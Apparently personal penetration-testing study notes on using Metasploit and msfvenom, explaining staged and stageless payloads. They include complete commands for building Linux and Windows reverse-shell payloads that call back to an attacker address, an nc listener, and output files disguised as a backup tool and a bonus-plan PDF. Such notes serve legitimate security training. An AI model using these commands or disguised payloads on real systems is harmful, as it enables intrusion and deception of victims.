# Running metasploit
1. `msfconsole`
2. `search ..`
3. `use ..`
4. `options`
5. `set ... ...`
6. `exploit`

# Crafting Payloads with MSFVenom
- `msfvenom -l payloads

## Staged Payloads
- eg. `windows/meterpreter/reverse_tcp`
- Payload sends a small stage to be executed on target
- Then calls back to attack box to download the remainder of the payload over the network
- Then executes shellcode to get reverse shell

# Stageless Payloads
- eg. `windows/meterpreter_reverse_tcp`
- Payload sent in entirety across network connection without a stage
- Could benefit in environments where do not have access to much bandwidth and latency can interfere

## Building stageless payload
- eg. `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf`
	- -p: creating payload
	- linux... : choosing the payload
	- LHOST, LPORT: the address to connect back to
		- Since this is a reverse shell, this is our machine
	- -f: format the binary will be in, in this case a .elf file
	- createbackup.elf: the output

- find someway to execute it on the target machine
- we also need a listener ready to catch the connection on our machine
	- `sudo nc -lvnp 443`

Windows version
- eg. `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe`
